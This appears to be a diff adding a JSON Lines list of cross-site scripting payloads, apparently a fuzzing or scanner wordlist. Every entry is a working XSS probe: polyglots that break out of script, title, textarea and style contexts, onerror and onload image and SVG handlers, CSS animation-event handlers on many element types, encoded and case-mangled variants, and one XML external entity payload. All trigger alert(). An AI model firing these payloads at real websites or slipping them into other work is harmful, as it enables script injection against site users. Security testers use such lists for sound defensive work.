+{"payload": "javascript:alert/*`/*\\/*'/*\\\"/*\"/**/(alert())// alert()//--></template><frame/onload=alert() <img src=x onerror=alert()></style/</title/</textarea/</noscript/</noembed/</script><script>alert()</script>"}
+{"payload": "javascript:/*\"/*'/*`/*\\\"/*</script/</title/</textarea/</style/</noscript></template></noembed>--><script>/*<svg <frame */ onload=alert()//</script>"}
+{"payload": "<script/x>alert(1)</script>"}
+{"payload": "\"'><script /*%00*/>/*%00*/alert(42)/*%00*/</script /*%00*/"}
+{"payload": "<script>javascript:alert(1)</script>"}
+{"payload": "innerHTML=location.hash>#<script>alert(1)</script>"}
+{"payload": "Exploit String: '';!--\"<script>alert(0);</script>=&{(alert(1))}"}
+{"payload": "<script itworksinallbrowsers>/*<script* */alert(1)</script ?"}
+{"payload": "</ foo=\"><script>alert(91)</script>\">"}
+{"payload": "</script><script>alert('XSS');</script>"}
+{"payload": "javascript:alert()//*-->*`/*'/*\"/*\\\"/*</title></textarea></style></noscript></noembed></template><frame src=javascript:alert()></script><script>/*<svg onload=alert()>*/ alert()//</script>"}
+{"payload": "</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-("}
+{"payload": "> <script>alert(4)</script>"}
+{"payload": "Exploit String: ';alert(0)//\\';alert(1)//\";alert(2)//\\\";alert(3)//--></SCRIPT>\">'></title><SCRIPT>alert(4)</SCRIPT>=&{</title><script>alert(5)</script>}\");}"}
+{"payload": "</ foo=\"><script>alert(1)</script>\">"}
+{"payload": "<script>alert(1);</script>"}
+{"payload": "</title><script>alert(/xss/)</script>"}
+{"payload": "</ foo=\"><script>javascript:alert(1)</script>\">"}
+{"payload": "\"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>"}
+{"payload": "<script src=\"data:text/javascript,alert(9252)\"></script>"}
+{"payload": "<? foo=\"><script>alert(91)</script>\">"}
+{"payload": "Exploit String: }</style><script>a=eval;b=alert;a(b(/i/.source));</script>"}
+{"payload": "\"></SCRIPT>\u201d>\u2019><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"}
+{"payload": "<svg xmlns=\"http://www.w3.org/2000/svg\">LOL<script>alert(123)</script></svg>"}
+{"payload": "\"><script>alert(1337)</script>\"><script>alert(\"XSS by \\nxss</h1></marquee>"}
+{"payload": "\"></iframe><script>alert(`TEXT YOU WANT TO BE DISPLAYED`);</script><iframe frameborder=\"0%EF%BB%BF"}
+{"payload": "</script><script>alert(1);</script>"}
+{"payload": "\"'`\u02bc\u02c8\u2018\u2019\u201a\u201b\u201c\u201d\u201e\u201f\u2032\u2033\u2034\u2035\u2036\u2037\ufe45\ufe50\uff02\uff07\uff0c\u8227\u8260\ufe10\ufe11--><script>alert(42)</script>"}
+{"payload": "<svg xmlns=\"#\"><script>alert(1)</script></svg>"}
+{"payload": "<<SCRIPT>alert(\"XSS\");//\\<</SCRIPT>"}
+{"payload": "';alert(0)//\\';alert(1)//\";alert(2)//\\\";alert(3)//--></SCRIPT>\">'></title><SCRIPT>alert(4)</SCRIPT>=&{</title><script>alert(5)</script>}\");}"}
+{"payload": "<style>@keyframes x{}</style><hr style=\"animation-name:x\" onanimationstart=\"alert(1)\"></hr>"}
+{"payload": "<style>@keyframes x{}</style><noscript style=\"animation-name:x\" onanimationstart=\"alert(1)\"></noscript>"}
+{"payload": "<style>@keyframes x{}</style><noscript style=\"animation-name:x\" onanimationend=\"alert(1)\"></noscript>"}
+{"payload": "<style>@keyframes x{}</style><ul style=\"animation-name:x\" onanimationstart=\"alert(1)\"></ul>"}
+{"payload": "\"/></a></><img src=1.gif onerror=alert(1)>"}
+{"payload": "<style>@keyframes x{}</style><iframe style=\"animation-name:x\" onanimationend=\"alert(1)\"></iframe>"}
+{"payload": "<style>@keyframes x{}</style><output style=\"animation-name:x\" onanimationstart=\"alert(1)\"></output>"}
+{"payload": "<style>@keyframes x{}</style><xmp style=\"animation-name:x\" onanimationend=\"alert(1)\"></xmp>"}
+{"payload": "<img/src='x'onerror=alert(1)>//INJECTX"}
+{"payload": "\"><img src=x onerror=javascript:alert(\"A\")>"}
+{"payload": "\"><img src=x onerror=javascript:alert(\"1\")>"}
+{"payload": "<svg/onload=alert(/INJECTX/)>"}
+{"payload": "<style>@keyframes x{}</style><figure style=\"animation-name:x\" onanimationend=\"alert(1)\"></figure>"}
+{"payload": "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>"}
+{"payload": "javascript:alert()//'//\"//\\\"//-->`//*/ alert();//</title></textarea></style></noscript></noembed></template><frame onload=alert()></select></script><<svg onload=alert()>"}
+{"payload": "javascript:\"/*'/*`/*\\\" /*</title></style></textarea></noscript></noembed></template></script/--><svg/onload=/*<html/*/onmouseover=alert()//>"}
+{"payload": "<img src=1 href=1 onerror=\"javascript:alert(4971)\"></img>"}
+{"payload": "<style>@keyframes x{}</style><aside style=\"animation-name:x\" onanimationend=\"alert(1)\"></aside>"}
+{"payload": "><svg onload=alert(1)>?a=reader"}
+{"payload": "<style>@keyframes x{}</style><nav style=\"animation-name:x\" onanimationend=\"alert(1)\"></nav>"}
+{"payload": "<style>@keyframes x{}</style><ol style=\"animation-name:x\" onanimationstart=\"alert(1)\"></ol>"}
+{"payload": "GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;"}
+{"payload": "<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>"}
+{"payload": "<style>@keyframes x{}</style><small style=\"animation-name:x\" onanimationstart=\"alert(1)\"></small>"}
+{"payload": "<style>@keyframes x{}</style><canvas style=\"animation-name:x\" onanimationstart=\"alert(1)\"></canvas>"}
+{"payload": "<div id=\"40\"><style><img src=\"</style><img src=x onerror=alert(40)//\">//[\"'`-->]]>]</div>"}
+{"payload": "<style>@keyframes x{}</style><ins style=\"animation-name:x\" onanimationend=\"alert(1)\"></ins>"}
+{"payload": "<style>@keyframes x{}</style><dfn style=\"animation-name:x\" onanimationstart=\"alert(1)\"></dfn>"}
+{"payload": "<style>@keyframes x{}</style><header style=\"animation-name:x\" onanimationend=\"alert(1)\"></header>"}
+{"payload": "<style>@keyframes x{}</style><table style=\"animation-name:x\" onanimationend=\"alert(1)\"></table>"}
+{"payload": "javascript:`//\"//\\\"//</title></textarea></style></noscript></noembed></script></template><svg/onload='/*--><html */ onmouseover=alert()//'>`"}
+{"payload": "<style>@keyframes x{}</style><details style=\"animation-name:x\" onanimationend=\"alert(1)\"></details>"}
+{"payload": "<style>@keyframes x{}</style><picture style=\"animation-name:x\" onanimationend=\"alert(1)\"></picture>"}
+{"payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"}
+{"payload": "<style>@keyframes x{}</style><data style=\"animation-name:x\" onanimationstart=\"alert(1)\"></data>"}
+{"payload": "<style>@keyframes x{}</style><form style=\"animation-name:x\" onanimationstart=\"alert(1)\"></form>"}
+{"payload": "<style>@keyframes x{}</style><fieldset style=\"animation-name:x\" onanimationstart=\"alert(1)\"></fieldset>"}
+{"payload": "<style>@keyframes x{}</style><small style=\"animation-name:x\" onanimationend=\"alert(1)\"></small>"}
+{"payload": "<img src ?notinChrome?\\/onerror = alert(42)"}
+{"payload": "</script><svg onload=alert(1)>"}
+{"payload": "<img src=`%00`&NewLine; onerror=alert(1)&NewLine;"}
+{"payload": "<style>@keyframes x{}</style><option style=\"animation-name:x\" onanimationstart=\"alert(1)\"></option>"}
+{"payload": "<style>@keyframes x{}</style><element style=\"animation-name:x\" onanimationstart=\"alert(1)\"></element>"}
+{"payload": "javascript:/*\"/*`/*'/*\\\"/*</script></style></template></select></title></textarea></noscript></noembed><frame/onload=alert()--><<svg/*/ onload=alert()//>"}
+{"payload": "<style>@keyframes x{}</style><progress style=\"animation-name:x\" onanimationstart=\"alert(1)\"></progress>"}
+{"payload": "<style>@keyframes x{}</style><textarea style=\"animation-name:x\" onanimationstart=\"alert(1)\"></textarea>"}
+{"payload": "<style>@keyframes x{}</style><ruby style=\"animation-name:x\" onanimationend=\"alert(1)\"></ruby>"}
+{"payload": "<style>@keyframes x{}</style><command style=\"animation-name:x\" onanimationend=\"alert(1)\"></command>"}
+{"payload": "javascript:`</template>\\\"///\"//</script/--></title/'</style/</textarea/</noembed/</noscript><<script/>/<frame */; onload=alert()//<</script>`"}
+{"payload": "javascript:alert()//\\ /*<svg/onload=';alert();'></textarea></style></title></noscript></template></noembed><frame onload=\";alert();\"></script>--><script>alert`;alert();`</script>*/alert()//\\\";alert()//"}
+{"payload": "javascript:/*--></title></style></template></noscript></noembed></textarea></script><svg/onload='+/\"/+/onclick=1/+/[*/[]/+alert()//'>\"><svg/onload=`+/\"/+/onclick=/+/[*/[]/+alert()//'>\"><script>alert()</script><frame src=\"javascript:alert()\"></frameset>+\\\"; alert()//<img src onerror=alert()>"}
+{"payload": "<style>@keyframes x{}</style><blockquote style=\"animation-name:x\" onanimationend=\"alert(1)\"></blockquote>"}
+{"payload": "\"><svg onload=alert(1)//"}
+{"payload": "javascript:alert()//--></title></style></noscript></noembed></template></select></textarea><frameset onload=alert()></script>*///\\\"//`//'//\"//><svg <svg onload=alert()> alert()//"}
+{"payload": "Exploit String: http://aa'><script>alert(123)</script>"}
+{"payload": "<style>@keyframes x{}</style><kbd style=\"animation-name:x\" onanimationstart=\"alert(1)\"></kbd>"}
+{"payload": "</title><script>alert(1)</script>"}
+{"payload": "<svg/onload=alert(5553)"}
+{"payload": "<<SCRIPT>alert(1110);//<</SCRIPT>"}
+{"payload": "<style>@keyframes x{}</style><a style=\"animation-name:x\" onanimationstart=\"alert(1)\"></a>"}
+{"payload": "<svg </onload =\"1> (_=alert,_(1)) \"\">"}
+{"payload": "<input type=image src=1 onerror=alert(1)>"}
+{"payload": "<style>@keyframes x{}</style><slot style=\"animation-name:x\" onanimationstart=\"alert(1)\"></slot>"}
+{"payload": "<style>@keyframes x{}</style><menu style=\"animation-name:x\" onanimationstart=\"alert(1)\"></menu>"}
+{"payload": "<svg onload=alert&lpar;1&rpar;>"}
+{"payload": "<style>@keyframes x{}</style><nextid style=\"animation-name:x\" onanimationend=\"alert(1)\"></nextid>"}
+{"payload": "<style>@keyframes x{}</style><kbd style=\"animation-name:x\" onanimationend=\"alert(1)\"></kbd>"}
+{"payload": "<body onload=alert(1)>"}
+{"payload": "<style>@keyframes x{}</style><input style=\"animation-name:x\" onanimationend=\"alert(1)\"></input>"}
+{"payload": "<img src=xss onerror=alert(1)>"}
+{"payload": "></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"}
+{"payload": "'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src=\"\" alt='"}
+{"payload": "--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->"}
+{"payload": "<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>"}
+{"payload": "<style>@keyframes x{}</style><menuitem style=\"animation-name:x\" onanimationstart=\"alert(1)\"></menuitem>"}
+{"payload": "<script x> alert(1) </script 1=2"}
+{"payload": "<style>@keyframes x{}</style><menu style=\"animation-name:x\" onanimationend=\"alert(1)\"></menu>"}
+{"payload": "\"><img src=x onerror=javascript:alert(1)>"}
+{"payload": "<style>@keyframes x{}</style><span style=\"animation-name:x\" onanimationend=\"alert(1)\"></span>"}
+{"payload": "<iframe srcdoc=\"&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>\">"}
+{"payload": "http://aa\"><script>alert(123)</script>"}
+{"payload": "<style>@keyframes x{}</style><image style=\"animation-name:x\" onanimationend=\"alert(1)\"></image>"}
+{"payload": "<style>@keyframes x{}</style><var style=\"animation-name:x\" onanimationend=\"alert(1)\"></var>"}
+{"payload": "<style>@keyframes x{}</style><marquee style=\"animation-name:x\" onanimationstart=\"alert(1)\"></marquee>"}
+{"payload": "<style>@keyframes x{}</style><time style=\"animation-name:x\" onanimationstart=\"alert(1)\"></time>"}
+{"payload": "<div id=\"64\"><!DOCTYPE x[<!ENTITY x SYSTEM \"http://html5sec.org/test.xxe\">]><y>&x;</y>//[\"'`-->]]>]</div><div id=\"65\"><svg onload=\"javascript:alert(65)\" xmlns=\"http://www.w3.org/2000/svg\"></svg>//[\"'`-->]]>]</div>"}
+{"payload": "<style>@keyframes x{}</style><q style=\"animation-name:x\" onanimationend=\"alert(1)\"></q>"}
+{"payload": "<style>@keyframes x{}</style><hgroup style=\"animation-name:x\" onanimationstart=\"alert(1)\"></hgroup>"}
+{"payload": "\\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src=\"\" alt=\\'"}
+{"payload": "\"><h1><IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>\">123</h1>"}
+{"payload": "data:text/html,<iframe src=javascript:alert(1)>"}
+{"payload": "Exploit String: <IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>"}
+{"payload": "<body onscroll=javascript:alert(8034)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>"}
+{"payload": "<input onfocus=javascript:alert(1454) autofocus>"}
+{"payload": "<!--<img src=\"--><img src=x onerror=javascript:alert(1)//\">"}
